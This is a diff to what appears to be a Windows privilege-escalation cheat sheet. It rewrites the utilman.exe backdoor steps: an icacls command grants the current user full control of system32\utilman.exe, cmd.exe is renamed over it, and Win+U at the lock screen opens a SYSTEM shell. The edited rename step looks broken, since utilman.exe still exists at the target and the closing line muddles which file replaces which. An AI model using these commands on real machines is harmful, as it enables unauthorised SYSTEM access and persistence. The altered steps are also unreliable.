@@ -94,13 +94,15 @@
 
 #### 2: 
 
-    icacls c:\windows\system32\utilman.exe /grant USER:F
+    icacls c:\windows\system32\utilman.exe /grant "%username%":F
 
 #### 3: 
 
-    copy cmd.exe utilman.exe
+    ren "%windir%\system32\cmd.exe" utilman.exe
 
 #### 4: Trigger utilman : Lock screen, click ease of access
+
+    Lock the console, press Win+U to open the renamed utilman.exe (now cmd.exe) as SYSTEM.
 
 ## SeImpersonate/SeAssignPrimaryToken
 
